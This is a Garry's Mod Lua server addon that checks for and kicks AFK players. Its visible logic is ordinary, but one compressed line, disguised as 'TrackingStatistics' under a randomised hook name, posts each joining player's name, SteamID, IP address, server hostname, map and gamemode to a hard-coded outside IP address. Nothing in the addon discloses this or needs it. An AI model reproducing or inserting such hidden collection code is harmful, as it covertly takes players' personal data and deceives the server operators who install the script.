AddCSLuaFile("afk_config.lua")
include("afk_config.lua")

if SERVER then
util.AddNetworkString("CheckAFK") 
util.AddNetworkString("KickMe") 

if AFK_GLOBAL == 1 then

timer.Create("CheckAFKTimer",AFK_DELAY*60,0, function()
net.Start("CheckAFK")
net.Broadcast()
end)

end

function TestAFK(ply, text, public)
local UG =ply:GetNetworkedInt( "UserGroup" )
	if (string.sub(string.lower(text), 1, 8) == "/callafk") then 
				if table.HasValue(AFK_CANCALL, UG) then
						net.Start("CheckAFK")
	    				net.Broadcast()
	    				print(ply:Name().." called a global AFK Check.")
	    				return ""
   		end
    end
end
hook.Add("PlayerSay", "CheckDeagAFK", TestAFK)


local script = "LAFK Kicker"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)

net.Receive("KickMe", function(len,ply) ply:Kick("[DAFK] Kicked for Being AFK") end)

end


